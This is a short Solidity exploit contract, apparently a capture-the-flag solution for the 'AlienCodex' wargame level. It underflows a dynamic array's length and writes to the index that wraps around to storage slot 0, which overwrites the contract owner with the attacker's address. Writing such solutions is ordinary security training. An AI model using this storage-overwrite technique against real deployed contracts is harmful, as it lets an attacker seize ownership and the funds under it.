// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {AlienCodex} from "../instances/Ilevel19.sol";

contract Attack {
    /*
     * Storage layout
     * 0 - _owner(20 bytes) contact(1 byte)
     * 1 - length of codex
     * codex[0] - keccak256(1)
     * codex[1] - keccak256(1) + 1
     * codex[2] - keccak256(1) + 2
     * 
     * .... so on, as a contract has 2**256 slots in total available 
     * there'll be a point when the contract slot will overflow and 
     * be equal to 0
     * say, h = keccak256(1) then h + i = 0
     * means i = -h
     */
    constructor(AlienCodex target) {
        target.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "attack failed");
    }
}
